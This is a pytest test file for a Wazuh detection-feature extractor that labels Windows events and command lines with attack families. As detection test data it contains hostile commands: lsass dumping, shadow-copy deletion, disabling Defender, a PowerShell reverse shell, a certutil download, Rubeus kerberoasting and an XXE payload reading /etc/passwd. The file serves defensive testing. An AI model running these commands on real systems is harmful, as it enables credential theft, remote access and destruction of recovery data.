from __future__ import annotations

from datetime import datetime, timedelta, timezone

import pytest

from app.wazuh_integration.detection_features import (
    MAX_CLOCK_DELTA_SECONDS,
    extract_detection_features,
)


def _features(
    event_id: str,
    *,
    source_family: str = "windows_endpoint",
    event_type: str = "",
    **processed,
):
    return extract_detection_features(
        {
            "event_id": event_id,
            "event_type": event_type,
            "processed_data": processed,
        },
        source_family,
    )


@pytest.mark.parametrize(
    ("event_id", "processed", "expected"),
    [
        ("1100", {}, {"event_logging_stopped": True}),
        ("1102", {}, {"audit_log_cleared": True}),
        (
            "4719",
            {"audit_policy_changes": "Success removed: %%8448"},
            {"audit_policy_weakened": True},
        ),
        (
            "4732",
            {"group_name": "BUILTIN\\Administrators"},
            {"privileged_group_membership": True},
        ),
        (
            "4657",
            {
                "object_name": (
                    r"\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows"
                    r"\CurrentVersion\Run"
                ),
                "object_value_name": "Updater",
            },
            {"registry_persistence": True},
        ),
        (
            "7045",
            {"image_path": r"C:\Users\Public\svc.exe"},
            {"suspicious_service_install": True},
        ),
    ],
)
def test_high_signal_windows_features(event_id, processed, expected):
    assert _features(event_id, **processed) == expected


def test_clock_change_is_thresholded_and_bounded():
    previous = datetime(2026, 1, 1, tzinfo=timezone.utc)

    assert _features(
        "4616",
        previous_time=previous.isoformat(),
        new_time=(previous + timedelta(seconds=299)).isoformat(),
    ) == {}
    assert _features(
        "4616",
        previous_time=previous.isoformat(),
        new_time=(previous + timedelta(seconds=300)).isoformat(),
    ) == {"large_clock_change": True, "clock_change_seconds": 300}
    assert _features(
        "4616",
        previous_time="2000-01-01T00:00:00Z",
        new_time="2050-01-01T00:00:00Z",
    ) == {
        "large_clock_change": True,
        "clock_change_seconds": MAX_CLOCK_DELTA_SECONDS,
    }


def test_scheduled_task_reads_only_exec_actions_and_rejects_xml_entities():
    suspicious = """<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
      <RegistrationInfo><Description>routine maintenance</Description></RegistrationInfo>
      <Actions><Exec><Command>powershell.exe</Command>
      <Arguments>-EncodedCommand QUFBQUFBQUFBQUFBQUFBQUFB</Arguments></Exec></Actions>
    </Task>"""
    benign = """<Task><Actions><Exec><Command>notepad.exe</Command>
      <Arguments>C:\\notes.txt</Arguments></Exec></Actions></Task>"""
    entity = """<!DOCTYPE Task [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
      <Task><Actions><Exec><Command>&xxe;</Command></Exec></Actions></Task>"""

    assert _features("4698", task_content=suspicious) == {
        "suspicious_scheduled_task": True
    }
    assert _features("4698", task_content=benign) == {}
    assert _features("4698", task_content=entity) == {}


@pytest.mark.parametrize(
    ("process_name", "command_line", "family"),
    [
        (r"C:\Tools\procdump64.exe", "procdump64.exe -ma lsass.exe out.dmp", "credential_dumping"),
        ("powershell.exe", "Invoke-ReflectivePEInjection -PEBytes $bytes", "process_injection"),
        ("vssadmin.exe", "vssadmin delete shadows /all /quiet", "recovery_inhibition"),
        (
            "powershell.exe",
            "Set-MpPreference -DisableRealtimeMonitoring $true",
            "defense_impairment",
        ),
        (
            "powershell.exe",
            "New-Object Net.Sockets.TCPClient('host',4444); Invoke-Expression $x",
            "reverse_shell",
        ),
        (
            "powershell.exe",
            "powershell -EncodedCommand QUFBQUFBQUFBQUFBQUFBQUFB",
            "powershell_obfuscation",
        ),
        ("wmic.exe", "wmic /node:server process call create cmd.exe", "lateral_movement"),
        (
            "net.exe",
            "net localgroup Administrators operator /add",
            "privileged_group_change",
        ),
        (
            "certutil.exe",
            "certutil -urlcache -split -f https://example.test/a.bin a.bin",
            "lolbin_transfer_or_execution",
        ),
        (r"C:\Tools\Rubeus.exe", "Rubeus.exe kerberoast", "known_attack_tool_execution"),
    ],
)
def test_process_attack_families_are_exactly_classified(
    process_name, command_line, family
):
    assert _features(
        "4688", new_process_name=process_name, command_line=command_line
    ) == {"process_attack_family": family}


@pytest.mark.parametrize(
    ("process_name", "command_line"),
    [
        ("powershell.exe", "Get-Process | Sort-Object CPU"),
        (
            "powershell.exe",
            "Set-MpPreference -DisableRealtimeMonitoring $false",
        ),
        ("powershell.exe", "Remove-MpPreference -ExclusionPath C:\\Temp"),
        ("certutil.exe", "certutil -hashfile C:\\file.bin SHA256"),
        ("cmd.exe", "cmd /c echo Rubeus.exe kerberoast"),
    ],
)
def test_normal_process_commands_do_not_create_attack_features(
    process_name, command_line
):
    assert _features(
        "4688", new_process_name=process_name, command_line=command_line
    ) == {}


@pytest.mark.parametrize(
    ("event_id", "processed"),
    [
        ("4719", {"audit_policy_changes": "Success added: %%8449; Failure added: %%8451"}),
        ("4732", {"group_name": "Users"}),
        ("4657", {"object_name": r"\REGISTRY\MACHINE\SOFTWARE\Vendor\Settings"}),
        ("7045", {"image_path": r'"C:\Program Files\Vendor\service.exe"'}),
        ("4768", {"status": "0x0"}),
    ],
)
def test_normal_windows_events_do_not_create_attack_features(event_id, processed):
    assert _features(event_id, **processed) == {}


@pytest.mark.parametrize(
    ("event_id", "status"),
    [("4625", None), ("4768", "0x12"), ("4769", "0x1F"), ("4776", "0xC000006A")],
)
def test_windows_authentication_failures_are_normalized(event_id, status):
    processed = {} if status is None else {"status": status}
    assert _features(event_id, **processed) == {"authentication_failure": True}


@pytest.mark.parametrize(
    ("event_id", "event_type", "action", "expected"),
    [
        (
            "NET-CONNECTION-BLOCK",
            "network_connection_blocked",
            "blocked",
            {"network_connection_blocked": True},
        ),
        (
            "NET-VPN-AUTH",
            "vpn_authentication",
            "rejected",
            {"vpn_authentication_rejected": True},
        ),
        (
            "NET-DEVICE-ADMIN",
            "device_admin",
            "denied",
            {"device_admin_rejected": True},
        ),
        ("NET-CONNECTION-ALLOW", "network_connection", "allowed", {}),
    ],
)
def test_network_security_features(event_id, event_type, action, expected):
    assert _features(
        event_id,
        source_family="network_device",
        event_type=event_type,
        action=action,
    ) == expected


def test_feature_output_is_bounded_and_scalar_only():
    features = _features(
        "4616",
        previous_time="2000-01-01T00:00:00Z",
        new_time="2050-01-01T00:00:00Z",
    )

    assert len(features) <= 4
    assert all(isinstance(value, (str, int, bool)) for value in features.values())
    assert all(not isinstance(value, str) or len(value) <= 128 for value in features.values())
